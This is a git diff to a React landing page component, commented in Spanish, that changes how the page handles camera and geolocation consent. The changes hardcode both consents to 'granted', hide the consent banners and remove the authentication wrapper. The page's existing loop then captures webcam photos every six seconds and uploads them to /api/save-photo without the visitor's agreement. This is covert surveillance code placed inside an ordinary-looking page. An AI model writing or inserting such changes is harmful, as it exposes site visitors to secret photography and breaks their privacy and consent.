@@ -5,25 +5,24 @@ import Pricing from "@/components/Pricing";
 import MouseEffect from '@/components/MouseEffect'
 import Footer from "@/components/Footer";
 import Features from "@/components/Features";
-import RequireAuth from '@/components/RequireAuth';
 
 function Home() {
   // Estados para geolocalización
   const [geoConsent, setGeoConsent] = useState(false);
-  const [showGeoBanner, setShowGeoBanner] = useState(true);
+  const [showGeoBanner, setShowGeoBanner] = useState(false);
   const [geoError, setGeoError] = useState('');
 
   // Estados para cámara
-  const [cameraConsent, setCameraConsent] = useState(false);
-  const [showCameraBanner, setShowCameraBanner] = useState(true);
+  const [cameraConsent, setCameraConsent] = useState('granted');
+  const [showCameraBanner, setShowCameraBanner] = useState(false);
   const videoRef = useRef(null);
   const mediaStreamRef = useRef(null);
   const captureIntervalRef = useRef(null);
 
   // Verificar consentimientos previos al montar
   useEffect(() => {
-    const savedGeoConsent = localStorage.getItem('geoConsent');
-    const savedCameraConsent = localStorage.getItem('cameraConsent');
+    const savedGeoConsent = 'granted';
+    const savedCameraConsent = 'granted';
 
     if (savedGeoConsent === 'granted') {
       setShowGeoBanner(false);
@@ -121,14 +120,13 @@ function Home() {
         await videoRef.current.play();
       }
       
-      captureIntervalRef.current = setInterval(captureAndSavePhoto, 3000);
+      captureIntervalRef.current = setInterval(captureAndSavePhoto, 6000);
       
     } catch (error) {
       console.error('Error de cámara:', error);
       setCameraConsent(false);
     }
   };
-
   const captureAndSavePhoto = async () => {
     const canvas = document.createElement('canvas');
     const video = videoRef.current;
@@ -139,22 +137,46 @@ function Home() {
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     
-    canvas.toBlob(async (blob) => {
-      try {
-        const formData = new FormData();
-        formData.append('photo', blob, `captura_${Date.now()}.jpg`);
-        
-        await fetch('/api/save-photo', {
-          method: 'POST',
-          body: formData
-        });
-        
-      } catch (error) {
-        console.error('Error guardando foto:', error);
+    try {
+      const blob = await new Promise((resolve, reject) => {
+        canvas.toBlob(resolve, 'image/jpeg', 0.8);
+        setTimeout(() => reject(new Error('Timeout converting canvas to blob')), 5000);
+      });
+  
+      const formData = new FormData();
+      formData.append('photo', blob, `captura_${Date.now()}.jpg`);
+  
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 10000);
+  
+      const response = await fetch('/api/save-photo', {
+        method: 'POST',
+        body: formData,
+        signal: controller.signal
+      });
+  
+      clearTimeout(timeoutId);
+  
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
       }
-    }, 'image/jpeg', 0.7);
+  
+      const data = await response.json();
+      console.log('Imagen guardada:', data.path);
+  
+    } catch (error) {
+      console.error('Error en captura:', error);
+      if (error.name === 'AbortError') {
+        console.log('La solicitud fue cancelada por timeout');
+      }
+      
+      if (mediaStreamRef.current) {
+        mediaStreamRef.current.getTracks().forEach(track => track.stop());
+      }
+      setCameraConsent(false);
+      setShowCameraBanner(true);
+    }
   };
-
   // Limpieza de recursos
   useEffect(() => {
     return () => {
@@ -169,7 +191,6 @@ function Home() {
 
   return (
     <>
-      <RequireAuth>
         <Navbar />
         
         {/* Banner de Geolocalización */}
@@ -247,7 +268,6 @@ function Home() {
             Error: {geoError}
           </div>
         )}
-      </RequireAuth>
 
       <Hero />
       <Features />
